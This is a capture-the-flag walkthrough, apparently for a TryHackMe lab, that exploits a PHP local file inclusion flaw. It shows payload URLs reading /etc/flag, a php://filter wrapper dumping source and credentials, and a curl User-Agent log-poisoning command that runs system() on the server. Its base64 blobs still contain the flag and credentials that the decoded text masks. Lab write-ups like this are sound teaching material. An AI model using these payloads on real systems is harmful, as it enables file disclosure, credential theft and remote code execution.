# LFI Vulnerability

[If you want to check my notes about LFI/RFI](https://github.com/itKhalid143/websec100/blob/main/Days/Day8-LFI%20%26%26%20RFI.md)

[LFI to RCE](https://github.com/itKhalid143/websec100/blob/main/Days/Day16-LFI-to-RCE.md)

***

## Task 1

- Firt thing after loading the website! we check that the application loads a file from the system! using ```err``` parameter.

```
http://10.10.70.88/index.php?err=error.txt
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/err.PNG)

## Task 2
- Let try to read ```/etc/flag``` file! with the same technique.

```
http://10.10.70.88/index.php?err=/etc/flag
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/q2.jpg)


## Task 3

- For this one! we can't directly load the file ```index.php``` because the php render it! and it will shows us error! first we have to encode is using wrapper! then decode it via [CyberChef](https://gchq.github.io/CyberChef/).

```
http://10.10.91.58/index.php?err=php://filter/convert.base64-encode/resource=index.php
```

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/q3.PNG)


```
PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+
```

```php
<?php session_start();
$flag = "THM{**********************}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){                        
  header( 'Location: manage.php' );
  die();
} else {
  $labNum = "";
  require "./includes/header.php";
?>
<div class="row">
  <div class="col-lg-12">
  </div>
  <div class="col-lg-8 col-offset-1">
      <?php if (isset($error)) { ?>
          <span class="text text-danger"><b><?php echo $error; ?></b></span>
      <?php }

?>
 <p>Welcome <?php echo getUserName(); ?></p>
  <div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
  </div>
<?php if($errInclude){ include($_GET['err']);} ?>
</div>

<?php
}
?>
```

## Task 4

- From the previous code! 

```php
include("./includes/creds.php");
```

Seems Interesting! let try to read the file with the same technique.
```
PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/
```

```php
<?php 
$USER = "******";
$PASS = "******";
?
```

Yaaay! We've made it guys! we got some credentials!

## Task 5

- Let try to login with the Credentials we get before!

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/login.PNG)

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/login2.PNG)


## Task 6

- Let check some logs here!

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/logs.PNG)

We can see the log is saved as:

```User```   :   ```IP Address```   :   ```User-Agent```   :   ```Path```

Let try to Inject some PHP codes in the User-agent using! ```curl -A```

```
curl -A "<?php system('hostname');?>" http://10.10.91.58/login.php
```

### Note:
- here's some PHP functions used to execute system commands: 
```php
exec();
system();
passthru();
popen();
proc_open();
```

Let check the log file!

Boom! We've got the hostname!

![****](/Advent%20of%20Cyber%203/Screenshots/Task6/q6.PNG)

Well done boiiis!